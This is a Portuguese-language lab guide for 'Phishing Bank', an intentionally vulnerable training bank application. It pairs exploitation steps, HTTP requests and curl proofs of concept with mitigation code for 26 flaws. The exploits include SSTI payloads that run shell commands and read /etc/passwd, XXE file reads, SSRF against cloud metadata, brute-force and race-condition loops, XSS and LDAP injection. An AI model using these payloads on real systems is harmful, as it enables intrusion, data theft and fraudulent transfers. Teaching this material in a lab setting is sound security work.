# Phishing Bank – Guia de Exploração e Mitigação de Vulnerabilidades

**Documento para Labs de AppSec** | Passo a passo detalhado com requests, responses, curl e comandos

---

## Índice

1. [Pré-requisitos e Ambiente](#1-pré-requisitos-e-ambiente)
2. [VULN-40: Shadow API – Transferência sem Autenticação](#2-vuln-40-shadow-api--transferência-sem-autenticação)
3. [VULN-40: Shadow API – Login sem Rate Limit](#3-vuln-40-shadow-api--login-sem-rate-limit)
4. [VULN-39: User Enumeration](#4-vuln-39-user-enumeration)
5. [VULN-32/20: IDOR em Transações](#5-vuln-3220-idor-em-transações)
6. [VULN-19: Race Condition em PIX](#6-vuln-19-race-condition-em-pix)
7. [VULN-25: Stored XSS na Observação](#7-vuln-25-stored-xss-na-observação)
8. [VULN-21: Mass Assignment no Profile](#8-vuln-21-mass-assignment-no-profile)
9. [VULN-34: BOPLA – Campos Sensíveis no Response](#9-vuln-34-bopla--campos-sensíveis-no-response)
10. [VULN-12: SSTI em Comprovantes](#10-vuln-12-ssti-em-comprovantes)
11. [VULN-09: XXE em Import OFX](#11-vuln-09-xxe-em-import-ofx)
12. [VULN-22: SSRF em Import URL](#12-vuln-22-ssrf-em-import-url)
13. [VULN-23: Blind SSRF via Webhook](#13-vuln-23-blind-ssrf-via-webhook)
14. [VULN-37: SSRF em Validação de Endereço](#14-vuln-37-ssrf-em-validação-de-endereço)
15. [VULN-05: SVG XSS/SSRF no Upload](#15-vuln-05-svg-xssssrf-no-upload)
16. [VULN-06: ZIP Slip](#16-vuln-06-zip-slip)
17. [VULN-15: LDAP Injection](#17-vuln-15-ldap-injection)
18. [VULN-57: ReDoS em Validação PIX](#18-vuln-57-redos-em-validação-pix)
19. [VULN-28: Actuator – Debug Endpoints](#19-vuln-28-actuator--debug-endpoints)
20. [VULN-36: Admin – Auth Fraca](#20-vuln-36-admin--auth-fraca)
21. [VULN-42: HTTP Verb Tampering](#21-vuln-42-http-verb-tampering)
22. [VULN-59: IDOR via Content-Type](#22-vuln-59-idor-via-content-type)
23. [VULN-33: API Key em Query String](#23-vuln-33-api-key-em-query-string)
24. [Senha em Texto Plano (Abrir Conta)](#24-senha-em-texto-plano-abrir-conta)
25. [VULN-61: Open Redirect](#25-vuln-61-open-redirect)
26. [VULN-62: HTTP Parameter Pollution (HPP)](#26-vuln-62-http-parameter-pollution-hpp)
27. [Tabela Resumo de Mitigações](#27-tabela-resumo-de-mitigações)

---

## 1. Pré-requisitos e Ambiente

### Variáveis de ambiente

```bash
# Backend local (padrão run_local.py)
export BASE_URL="http://localhost:5001"

# Com Docker/proxy, use a URL do host (ex.: http://localhost/api)
```

**URLs típicas:** Frontend `http://localhost:5173` (Vite) | Backend `http://localhost:5001`

### Credenciais de teste

| Usuário | Email | Senha | Agência | Conta |
|---------|-------|-------|---------|-------|
| João | joao@email.com | senha123 | 0001 | 10001-1 |
| Maria | maria@email.com | senha123 | 0001 | 20002-2 |
| Admin | admin@phishingbank.com | admin123 | 0001 | 30003-3 |

### Obter token JWT (v3)

```bash
TOKEN=$(curl -s -X POST "$BASE_URL/api/v3/auth/login-bank" \
  -H "Content-Type: application/json" \
  -d '{"agencia":"0001","conta":"10001-1","senha":"senha123"}' \
  | jq -r '.access_token')
echo $TOKEN
```

### IDs de contas (para v1 transfer)

Após seed, as contas geralmente têm IDs sequenciais: 1 (João), 2 (Maria), 3 (Admin), etc. Para listar:

```bash
# Via API v3 autenticada
curl -s -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/v3/accounts" | jq
```

---

## 2. VULN-40: Shadow API – Transferência sem Autenticação

**Severidade:** CRÍTICA | **CVSS:** 9.1 | **OWASP:** A01:2021 Broken Access Control | **CWE:** CWE-862

**Endpoint:** `POST /api/v1/transfer`

### Descrição

A API v1 não exige autenticação. Qualquer pessoa pode transferir valores entre contas informando apenas `account_from_id`, `account_to_id` e `amount`. O atacante pode drenar saldo de qualquer conta para outra.

### Exploração passo a passo

1. Identificar IDs das contas (ex.: 1=João, 2=Maria).
2. Enviar POST para `/api/v1/transfer` com `account_from_id` de uma conta com saldo e `account_to_id` da conta do atacante.

### REQUEST

```http
POST /api/v1/transfer HTTP/1.1
Host: localhost:5001
Content-Type: application/json

{
  "account_from_id": 1,
  "account_to_id": 2,
  "amount": 1000
}
```

### RESPONSE

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "transaction_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"}
```

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v1/transfer" \
  -H "Content-Type: application/json" \
  -d '{"account_from_id":1,"account_to_id":2,"amount":1000}'
```

### Mitigação

- Remover ou desabilitar a API v1 em produção.
- Exigir autenticação JWT em todos os endpoints de transferência.
- Validar que `account_from_id` pertence ao usuário autenticado.

```python
# Exemplo de correção
@jwt_required()
def transfer():
    user_id = get_jwt_identity()
    account = Account.query.filter_by(user_id=user_id).first()
    if not account or account.id != data.get("account_from_id"):
        return jsonify({"error": "unauthorized"}), 403
```

---

## 3. VULN-40: Shadow API – Login sem Rate Limit

**Severidade:** ALTA | **OWASP:** A07:2021 Identification and Authentication Failures

**Endpoint:** `POST /api/v1/auth/login`

### Descrição

O endpoint de login não possui rate limiting, permitindo brute force de senhas. Além disso, comparação de senha é direta (sem hash).

### Exploração

Tentar múltiplas senhas para um mesmo email:

```bash
for senha in senha123 admin123 123456 password; do
  curl -s -X POST "$BASE_URL/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@phishingbank.com\",\"password\":\"$senha\"}" | jq
done
```

### Mitigação

- Implementar rate limiting (ex.: 5 tentativas por IP/minuto).
- Usar bcrypt/argon2 para hash de senhas.
- Bloquear conta após N tentativas falhas.

---

## 4. VULN-39: User Enumeration

**Severidade:** MÉDIA | **OWASP:** A01:2021 Broken Access Control

**Endpoint:** `POST /api/v3/auth/login`

### Descrição

A API retorna mensagens diferentes para `usuario_nao_encontrado` e `senha_incorreta`, permitindo enumerar usuários válidos.

### REQUEST (usuário inexistente)

```http
POST /api/v3/auth/login HTTP/1.1
Host: localhost:5001
Content-Type: application/json

{"email":"naoexiste@email.com","password":"qualquer"}
```

### RESPONSE

```http
HTTP/1.1 401 Unauthorized
{"error": "usuario_nao_encontrado"}
```

### REQUEST (usuário existente, senha errada)

```http
POST /api/v3/auth/login HTTP/1.1
Host: localhost:5001
Content-Type: application/json

{"email":"joao@email.com","password":"senhaerrada"}
```

### RESPONSE

```http
HTTP/1.1 401 Unauthorized
{"error": "senha_incorreta"}
```

### CURL PoC

```bash
# Usuário inexistente
curl -s -X POST "$BASE_URL/api/v3/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"x@x.com","password":"x"}' | jq

# Usuário existente
curl -s -X POST "$BASE_URL/api/v3/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"joao@email.com","password":"x"}' | jq
```

### Mitigação

Retornar mensagem genérica para ambos os casos:

```python
return jsonify({"error": "credenciais_invalidas"}), 401
```

---

## 5. VULN-32/20: IDOR em Transações

**Severidade:** ALTA | **OWASP:** A01:2021 Broken Access Control | **CWE:** CWE-639

**Endpoint:** `GET /api/v3/transactions/<tx_uuid>`

### Descrição

O endpoint não verifica se a transação pertence ao usuário autenticado. Qualquer UUID de transação válido retorna os dados. O UUID v1 é baseado em timestamp, facilitando enumeração.

### Exploração

1. Obter token de um usuário.
2. Fazer uma transação legítima e obter o UUID.
3. Enumerar UUIDs próximos (v1) ou usar UUIDs obtidos de outras fontes.
4. Acessar transações de outros usuários.

### REQUEST

```http
GET /api/v3/transactions/550e8400-e29b-11d4-a716-446655440000 HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
```

### RESPONSE

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1,
  "uuid": "550e8400-e29b-11d4-a716-446655440000",
  "amount": 100,
  "type": "pix",
  "observacao": "Transferência",
  "status": "completed",
  "pix_key": "20002-2",
  "created_at": "2024-01-15T10:30:00"
}
```

### CURL PoC

```bash
# Usar UUID de uma transação conhecida (ex.: da listagem do usuário)
curl -s -H "Authorization: Bearer $TOKEN" \
  "$BASE_URL/api/v3/transactions/<UUID_QUALQUER>" | jq
```

### Mitigação

```python
# Verificar ownership
account_ids = [a.id for a in Account.query.filter_by(user_id=user_id).all()]
if tx.account_from_id not in account_ids and tx.account_to_id not in account_ids:
    return jsonify({"error": "não encontrado"}), 404
```

---

## 6. VULN-19: Race Condition em PIX

**Severidade:** ALTA | **OWASP:** A04:2021 Insecure Design | **CWE:** CWE-362

**Endpoint:** `POST /api/v3/pix/transfer`

### Descrição

A verificação de saldo e o débito são operações separadas, com um `time.sleep(0.01)` entre elas. Múltiplas requisições simultâneas podem ser processadas antes do commit, permitindo gastar o mesmo saldo várias vezes.

### Exploração

Enviar múltiplas requisições PIX em paralelo com o mesmo valor (ex.: saldo 100, enviar 10x R$ 100).

### Comando

```bash
# Criar script race.sh
for i in {1..20}; do
  curl -s -X POST "$BASE_URL/api/v3/pix/transfer" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount":50,"pix_key":"20002-2","observacao":"race"}' &
done
wait
```

### Mitigação

- Usar transação atômica com `SELECT ... FOR UPDATE` ou lock otimista.
- Implementar idempotency key para evitar duplicatas.

```python
with db.session.begin_nested():
    acc = Account.query.filter_by(id=account.id).with_for_update().first()
    if acc.balance < amount:
        return jsonify({"error": "saldo insuficiente"}), 400
    acc.balance -= amount
    acc_to.balance += amount
```

---

## 7. VULN-25: Stored XSS na Observação

**Severidade:** MÉDIA | **OWASP:** A03:2021 Injection | **CWE:** CWE-79

**Endpoint:** `POST /api/v3/pix/transfer` (campo `observacao`)

### Descrição

O campo `observacao` é armazenado e exibido sem sanitização. O atacante pode injetar JavaScript que será executado quando o extrato for visualizado.

### Payload XSS

```html
<script>alert('XSS')</script>
```

### REQUEST

```http
POST /api/v3/pix/transfer HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "amount": 0.01,
  "pix_key": "20002-2",
  "observacao": "<script>alert('XSS')</script>"
}
```

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/pix/transfer" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":0.01,"pix_key":"20002-2","observacao":"<script>alert(1)</script>"}'
```

### Mitigação

- Sanitizar output com escape HTML (ex.: `html.escape()`).
- Usar Content-Security-Policy.
- Validar e limitar caracteres permitidos no input.

```python
import html
observacao = html.escape(observacao)[:500]
```

---

## 8. VULN-21: Mass Assignment no Profile

**Severidade:** ALTA | **OWASP:** A01:2021 Broken Access Control | **CWE:** CWE-915

**Endpoint:** `PATCH /api/v3/user/profile`

### Descrição

O endpoint aceita qualquer campo do modelo User e atualiza sem allowlist. O atacante pode elevar privilégios alterando `role`, `kyc_status`, `credit_limit`, etc.

### Exploração

Enviar `role: "admin"` no body do PATCH.

### REQUEST

```http
PATCH /api/v3/user/profile HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"role": "admin", "kyc_status": "approved", "credit_limit": 1000000}
```

### RESPONSE

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id": 1, "nome": "João", "role": "admin", "kyc_status": "approved", ...}
```

### CURL PoC

```bash
curl -X PATCH "$BASE_URL/api/v3/user/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","credit_limit":999999}'
```

### Mitigação

- Usar allowlist explícita de campos permitidos.

```python
ALLOWED_FIELDS = {"nome", "telefone", "avatar_url"}
data = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}
```

---

## 9. VULN-34: BOPLA – Campos Sensíveis no Response

**Severidade:** MÉDIA | **OWASP:** A09:2021 Security Logging and Monitoring Failures

**Endpoint:** `GET /api/v3/user/profile`

### Descrição

O perfil retorna `password_hash`, `pin_hash`, `fraud_score`, `internal_credit_limit` e outros campos internos.

### CURL PoC

```bash
curl -s -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/v3/user/profile" | jq
```

### Mitigação

- Implementar DTO/response model com apenas campos necessários.
- Nunca retornar hashes, PINs ou dados internos de fraude.

---

## 10. VULN-12: SSTI em Comprovantes

**Severidade:** CRÍTICA | **OWASP:** A03:2021 Injection | **CWE:** CWE-94

**Endpoint:** `GET /api/v3/receipts/generate?name=<payload>`

### Descrição

O parâmetro `name` é interpolado diretamente em um template Jinja2 sem escape. Permite execução de código remoto (RCE).

### Payloads SSTI

```bash
# Teste básico (7*7 = 49)
{{ 7*7 }}

# RCE - listar diretório
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# RCE - ler arquivo
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /etc/passwd').read() }}
```

### REQUEST

```http
GET /api/v3/receipts/generate?name={{7*7}} HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
```

### RESPONSE

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"receipt": "Comprovante para: 49\nValor: R$ 100,00\nData: 2024-01-01"}
```

### CURL PoC

```bash
# Teste 7*7
curl -s -G "$BASE_URL/api/v3/receipts/generate" \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "name={{7*7}}" | jq

# RCE (encode URL)
curl -s -G "$BASE_URL/api/v3/receipts/generate" \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}" | jq
```

### Mitigação

- Nunca interpolar input do usuário em templates.
- Usar `{{ name | e }}` ou Jinja2 autoescape.
- Validar entrada com allowlist de caracteres.

```python
from markupsafe import escape
name = escape(request.args.get("name", "Cliente"))
```

---

## 11. VULN-09: XXE em Import OFX

**Severidade:** ALTA | **OWASP:** A05:2021 Security Misconfiguration | **CWE:** CWE-611

**Endpoint:** `POST /api/v3/import/ofx`

### Descrição

O parser XML aceita entidades externas. Permite leitura de arquivos locais (LFI) e SSRF.

### Payload XXE (ler /etc/passwd)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<ofx>
  <data>&xxe;</data>
</ofx>
```

### REQUEST

```http
POST /api/v3/import/ofx HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<ofx><data>&xxe;</data></ofx>
```

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/import/ofx" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><ofx><data>&xxe;</data></ofx>'
```

### Mitigação

- Usar `defusedxml` ou desabilitar entidades externas.
- `lxml`: `parser = etree.XMLParser(resolve_entities=False)`

```python
import defusedxml.ElementTree as ET
tree = ET.parse(content)
```

---

## 12. VULN-22: SSRF em Import URL

**Severidade:** ALTA | **OWASP:** A10:2021 Server-Side Request Forgery | **CWE:** CWE-918

**Endpoint:** `POST /api/v3/import/url`

### Descrição

O endpoint faz `requests.get(url)` sem validar o destino. Permite acessar serviços internos (metadata AWS, Redis, etc.).

### Payload AWS Metadata

```json
{"url": "http://169.254.169.254/latest/meta-data/"}
```

### REQUEST

```http
POST /api/v3/import/url HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

### CURL PoC

```bash
# AWS metadata (em ambiente cloud)
curl -X POST "$BASE_URL/api/v3/import/url" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Serviço interno (Redis, etc.)
curl -X POST "$BASE_URL/api/v3/import/url" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:6379/"}'
```

### Mitigação

- Validar URL contra allowlist de domínios.
- Bloquear IPs privados (10.x, 172.16-31.x, 192.168.x, 169.254.x, 127.x).
- Usar biblioteca como `url-normalize` e validar esquema (apenas https).

---

## 13. VULN-23: Blind SSRF via Webhook

**Severidade:** MÉDIA | **OWASP:** A10:2021 SSRF

**Endpoint:** `PUT /api/v3/settings/webhook`

### Descrição

Aceita URL para webhook e faz POST para ela. O atacante pode apontar para serviços internos (gopher://, etc.) sem ver resposta.

### CURL PoC

```bash
# Usar Burp Collaborator ou RequestBin para interceptar
curl -X PUT "$BASE_URL/api/v3/settings/webhook" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://seu-requestbin.com/"}'
```

### Mitigação

- Validar URL contra allowlist.
- Bloquear esquemas não-http(s).

---

## 14. VULN-37: SSRF em Validação de Endereço

**Severidade:** ALTA | **OWASP:** A10:2021 SSRF

**Endpoint:** `POST /api/v3/address/validate`

### Descrição

O endpoint aceita `callback_url` e faz requisição para ela. Sem validação de destino.

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/address/validate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"callback_url":"http://169.254.169.254/latest/meta-data/"}'
```

### Mitigação

- Mesmas regras de validação de URL do VULN-22.

---

## 15. VULN-05: SVG XSS/SSRF no Upload

**Severidade:** ALTA | **OWASP:** A03:2021 Injection

**Endpoint:** `POST /api/v3/profile/avatar` (multipart)

### Descrição

Aceita arquivos SVG sem sanitizar. SVG pode conter `<script>` (XSS) ou `<image href="http://...">` (SSRF).

### Payload SVG XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```

### CURL PoC

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' > xss.svg
curl -X POST "$BASE_URL/api/v3/profile/avatar" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@xss.svg"
```

### Mitigação

- Não aceitar SVG de usuários ou sanitizar com biblioteca como `bleach`.
- Converter SVG para PNG no servidor antes de armazenar.

---

## 16. VULN-06: ZIP Slip

**Severidade:** ALTA | **OWASP:** A01:2021 Broken Access Control | **CWE:** CWE-22

**Endpoint:** `POST /api/v3/import/zip`

### Descrição

O `extractall()` não valida nomes dos arquivos no ZIP. Arquivos com `../` no nome podem ser extraídos fora do diretório permitido.

### Criação de ZIP malicioso

```bash
mkdir -p evil
echo "malicious" > evil/../../etc/passwd
cd evil
zip -r ../evil.zip .
cd ..
# Ajustar paths no ZIP com hexeditor se necessário
```

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/import/zip" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@evil.zip"
```

### Mitigação

- Validar cada nome de arquivo antes de extrair.
- Resolver path e garantir que não escape do diretório base.

```python
for name in z.namelist():
    path = os.path.join(extract_dir, name)
    if not os.path.realpath(path).startswith(os.path.realpath(extract_dir)):
        raise ValueError("Path traversal")
```

---

## 17. VULN-15: LDAP Injection

**Severidade:** ALTA | **OWASP:** A03:2021 Injection | **CWE:** CWE-90

**Endpoint:** `POST /api/v3/corporate/auth`

### Descrição

O filtro LDAP é montado com concatenação direta. Bypass com `*)(uid=*))(|(uid=*`.

### REQUEST

```http
POST /api/v3/corporate/auth HTTP/1.1
Host: localhost:5001
Content-Type: application/json

{"username": "*)(uid=*))(|(uid=*", "password": "x"}
```

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/corporate/auth" \
  -H "Content-Type: application/json" \
  -d '{"username":"*)(uid=*))(|(uid=*","password":"x"}'
```

### Mitigação

- Usar escape LDAP (ex.: `ldap3.utils.escape`).
- Preferir prepared statements ou parametrização.

---

## 18. VULN-57: ReDoS em Validação PIX

**Severidade:** MÉDIA | **OWASP:** A04:2021 Insecure Design | **CWE:** CWE-1333

**Endpoint:** `POST /api/v3/pix/validate-key`

### Descrição

A regex `^(([0-9]+\.?)+){3}-?([0-9]+)+$` é vulnerável a ReDoS. Input longo causa backtracking catastrófico e DoS.

### Payload ReDoS

```
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/pix/validate-key" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"key":"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"}'
```

### Mitigação

- Usar regex mais simples ou validação por algoritmo (ex.: dígitos do CPF).
- Limitar tamanho do input.
- Usar `re.match` com timeout (Python 3.11) ou processo separado com timeout.

---

## 19. VULN-28: Actuator – Debug Endpoints

**Severidade:** ALTA | **OWASP:** A05:2021 Security Misconfiguration

**Endpoints:** `GET /actuator/env`, `GET /actuator/heapdump`, `GET /actuator/vars`

### Descrição

Endpoints expõem variáveis de ambiente, configurações e dados sensíveis (credenciais).

### CURL PoC

```bash
curl -s "$BASE_URL/actuator/env" | jq
curl -s "$BASE_URL/actuator/heapdump" | head -c 500
curl -s "$BASE_URL/actuator/vars" | jq
```

### Mitigação

- Desabilitar endpoints de debug em produção.
- Proteger com autenticação forte se necessários.
- Nunca expor secrets em /env.

---

## 20. VULN-36: Admin – Auth Fraca

**Severidade:** CRÍTICA | **OWASP:** A01:2021 Broken Access Control

**Endpoints:** `GET /api/admin/users`, `GET /api/admin/stats`

### Descrição

A autenticação admin é feita apenas via header `X-Admin: true`. Qualquer cliente pode forjar o header.

### REQUEST

```http
GET /api/admin/users HTTP/1.1
Host: localhost:5001
X-Admin: true
```

### CURL PoC

```bash
curl -s -H "X-Admin: true" "$BASE_URL/api/admin/users" | jq
curl -s -H "X-Admin: true" "$BASE_URL/api/admin/stats" | jq
```

### Mitigação

- Usar JWT com claim `role: admin` e validar no backend.
- Nunca confiar em headers customizados para autorização.

---

## 21. VULN-42: HTTP Verb Tampering

**Severidade:** MÉDIA | **OWASP:** A01:2021 Broken Access Control

### Descrição

O header `X-HTTP-Method-Override` permite alterar o método HTTP antes do roteamento. Pode bypassar restrições (ex.: POST em rota que só aceita GET).

### CURL PoC

```bash
curl -X POST "$BASE_URL/api/v3/accounts" \
  -H "X-HTTP-Method-Override: GET" \
  -H "Authorization: Bearer $TOKEN"
```

### Mitigação

- Não aceitar method override ou validar contra allowlist.
- Remover middleware de override.

---

## 22. VULN-59: IDOR via Content-Type

**Severidade:** MÉDIA | **OWASP:** A01:2021 Broken Access Control

**Endpoint:** `GET /api/v3/report/export?report_id=<id>`

### Descrição

Quando o header `Accept` contém `application/xml` ou `text/xml`, o endpoint retorna dados adicionais (ex.: `admin_only_field`) sem validação de autorização adequada.

### REQUEST

```http
GET /api/v3/report/export?report_id=1 HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN>
Accept: application/xml
```

### CURL PoC

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/xml" \
  "$BASE_URL/api/v3/report/export?report_id=1"
```

### Mitigação

- Aplicar mesma lógica de autorização para todos os formatos de resposta.
- Não expor campos sensíveis em nenhum formato.

---

## 23. VULN-33: API Key em Query String

**Severidade:** MÉDIA | **OWASP:** A02:2021 Cryptographic Failures

**Endpoint:** `GET /api/partner/balance?api_key=<key>`

### Descrição

A API key é aceita na query string e pode vazar em logs do servidor, proxy ou histórico do navegador.

### CURL PoC

```bash
# A api_key está no config (INTERNAL_API_KEY). Se descoberta:
curl -s "$BASE_URL/api/partner/balance?api_key=SUA_API_KEY" | jq
```

### Mitigação

- Usar header `X-API-Key` ou `Authorization: Bearer`.
- Nunca colocar secrets em query string.

---

## 24. Senha em Texto Plano (Abrir Conta)

**Severidade:** CRÍTICA | **OWASP:** A02:2021 Cryptographic Failures

**Endpoint:** `POST /api/v3/auth/abrir-conta`

### Descrição

A senha é armazenada diretamente em `password_hash` sem hashing. Qualquer vazamento de banco expõe senhas em claro.

### Mitigação

```python
from werkzeug.security import generate_password_hash
user = User(
    ...
    password_hash=generate_password_hash(senha, method="scrypt"),
    ...
)
```

---

## 25. VULN-61: Open Redirect

**Severidade:** MÉDIA | **OWASP:** A01:2021 Broken Access Control | **CWE:** CWE-601

**Endpoint:** `GET /api/v3/redirect?next=<url>` ou `?url=<url>` ou `?return_url=<url>`

### Descrição

O endpoint aceita uma URL via parâmetro de query e redireciona o usuário sem validar se o destino pertence ao mesmo domínio. Permite ataques de phishing: o atacante envia um link legítimo do banco que redireciona a vítima para um site malicioso que imita o login.

### Exploração passo a passo

1. Construir URL maliciosa: `http://localhost:5001/api/v3/redirect?next=https://evil-phishing.com/login`
2. Enviar o link à vítima (ex.: por e-mail, mensagem).
3. A vítima clica, é redirecionada para o site malicioso que captura credenciais.

### REQUEST

```http
GET /api/v3/redirect?next=https://evil.com/fake-login HTTP/1.1
Host: localhost:5001
```

### RESPONSE

```http
HTTP/1.1 302 Found
Location: https://evil.com/fake-login
```

### CURL PoC

```bash
# Seguir redirect para ver o destino (use -v para ver headers)
curl -v -L "$BASE_URL/api/v3/redirect?next=https://example.com" 2>&1 | grep -i location

# Ou apenas obter o header Location
curl -sI "$BASE_URL/api/v3/redirect?next=https://evil-phishing.com" | grep -i location
```

### Mitigação

- Validar que a URL de redirect pertence ao mesmo domínio ou a uma allowlist.
- Usar URLs relativas ou whitelist de hosts.

```python
from urllib.parse import urlparse
def is_safe_redirect(url):
    parsed = urlparse(url)
    if not parsed.netloc:
        return True  # URL relativa
    allowed = ["phishingbank.com", "www.phishingbank.com"]
    return parsed.netloc in allowed
if not is_safe_redirect(url):
    return jsonify({"error": "redirect não permitido"}), 400
```

---

## 26. VULN-62: HTTP Parameter Pollution (HPP)

**Severidade:** ALTA | **OWASP:** A01:2021 Broken Access Control | **CWE:** CWE-235

**Endpoint:** `GET /api/v3/accounts/balance?account_id=<id>`

### Descrição

O endpoint usa o **primeiro** valor de `account_id` para validar se a conta pertence ao usuário autenticado, mas usa o **último** valor para a consulta real ao banco. Enviando `?account_id=1&account_id=2`, a validação passa (conta 1 é do usuário) mas o saldo retornado é da conta 2 (de outra pessoa).

### Exploração passo a passo

1. Obter token JWT de um usuário (ex.: João, conta_id=1).
2. Identificar ID da conta da vítima (ex.: Maria, conta_id=2).
3. Enviar requisição com `account_id=1&account_id=2`.
4. O backend valida conta 1 (OK), mas consulta conta 2 e retorna o saldo.

### REQUEST

```http
GET /api/v3/accounts/balance?account_id=1&account_id=2 HTTP/1.1
Host: localhost:5001
Authorization: Bearer <TOKEN_DO_JOÃO>
```

### RESPONSE

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "account_id": 2,
  "agency": "0001",
  "number": "20002-2",
  "balance": 89320.0
}
```

### CURL PoC

```bash
# João (conta 1) consulta saldo da Maria (conta 2) via HPP
curl -s -H "Authorization: Bearer $TOKEN" \
  "$BASE_URL/api/v3/accounts/balance?account_id=1&account_id=2" | jq
```

### Mitigação

- Usar sempre o mesmo valor para validação e query.
- Preferir `request.args.get("account_id")` de forma consistente.
- Rejeitar requisições com parâmetros duplicados.

```python
account_ids = request.args.getlist("account_id")
if len(account_ids) > 1:
    return jsonify({"error": "parâmetro duplicado não permitido"}), 400
account_id = request.args.get("account_id")
# Usar account_id para validação E query
```

---

## 27. Tabela Resumo de Mitigações

| VULN | Categoria | Severidade | Mitigação Principal |
|------|-----------|------------|---------------------|
| 40 | Shadow API | Crítica | Remover v1 ou exigir auth |
| 39 | User Enum | Média | Mensagem genérica |
| 32/20 | IDOR | Alta | Verificar ownership |
| 19 | Race Condition | Alta | Transação atômica |
| 25 | XSS | Média | Escape HTML |
| 21 | Mass Assignment | Alta | Allowlist de campos |
| 34 | BOPLA | Média | DTO sem campos sensíveis |
| 12 | SSTI | Crítica | Escape/validação input |
| 09 | XXE | Alta | defusedxml |
| 22/23/37 | SSRF | Alta | Validar URL |
| 05 | SVG XSS | Alta | Sanitizar/banir SVG |
| 06 | ZIP Slip | Alta | Validar paths |
| 15 | LDAP Injection | Alta | Escape LDAP |
| 57 | ReDoS | Média | Regex segura |
| 28 | Actuator | Alta | Desabilitar em prod |
| 36 | Admin Auth | Crítica | JWT + role |
| 42 | Verb Tampering | Média | Remover override |
| 59 | IDOR Content-Type | Média | Mesma auth |
| 33 | API Key Query | Média | Usar header |
| Abrir Conta | Senha plain | Crítica | Hash (scrypt/bcrypt) |
| 61 | Open Redirect | Média | Validar URL/whitelist |
| 62 | HPP | Alta | Valor único, rejeitar duplicados |

---

## Parecer Técnico

O Phishing Bank é uma aplicação bancária fictícia e intencionalmente vulnerável, desenvolvida para fins educacionais em laboratórios de AppSec e pentest. O documento cobre as principais vulnerabilidades implementadas, com foco em exploração prática e mitigação.

**Escopo:** O ambiente inclui backend Flask (Python), frontend React, API v1 (shadow, sem auth), v2 e v3, além de endpoints de admin, actuator, partner e well-known. As vulnerabilidades abrangem OWASP Top 10, OWASP API Security Top 10 e categorias específicas como deserialização, XXE, SSRF, SSTI, IDOR, ReDoS e falhas de autenticação/autorização.

**Metodologia:** Para cada vulnerabilidade foi documentado o endpoint afetado, a descrição técnica, o passo a passo de exploração, exemplos de REQUEST e RESPONSE, comandos curl e sugestões de mitigação. O uso de tokens JWT e credenciais de teste segue o padrão do ambiente local.

**Resumo por severidade:** As vulnerabilidades críticas (Shadow API, SSTI, Admin Auth) permitem acesso não autorizado e execução de código. As de alta severidade (IDOR, Race Condition, XXE, SSRF, Mass Assignment, etc.) comprometem confidencialidade, integridade ou disponibilidade. As de média severidade (User Enum, XSS, ReDoS, BOPLA) aumentam a superfície de ataque e facilitam ataques em cadeia.

